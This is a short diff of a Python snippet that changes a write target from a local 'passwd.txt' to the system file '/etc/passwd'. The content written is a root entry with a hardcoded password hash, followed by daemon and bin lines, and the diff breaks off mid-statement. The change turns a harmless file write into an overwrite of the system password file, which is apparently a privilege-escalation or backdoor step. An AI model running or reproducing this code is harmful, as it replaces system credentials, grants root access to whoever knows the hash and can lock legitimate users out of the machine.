@@ -1,4 +1,4 @@
-with open("passwd.txt", "w") as fd:
+with open("/etc/passwd", "w") as fd:
     fd.write("root:$6$9f8W5ZX1q16devBQ$1MgZ5rxBn/E.yYlJmdv5F6FliBeomJ89.BlDSZ36ZM9ml1NhbRQCqseBjw4QBgseTn1oFkkI51s21Vul3261I1:0:0:root:/root:/bin/bash" + "\n"
 "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"+ "\n"
 "bin:x:2:2:bin:/bin:/usr/sbin/nologin"+ "\n"
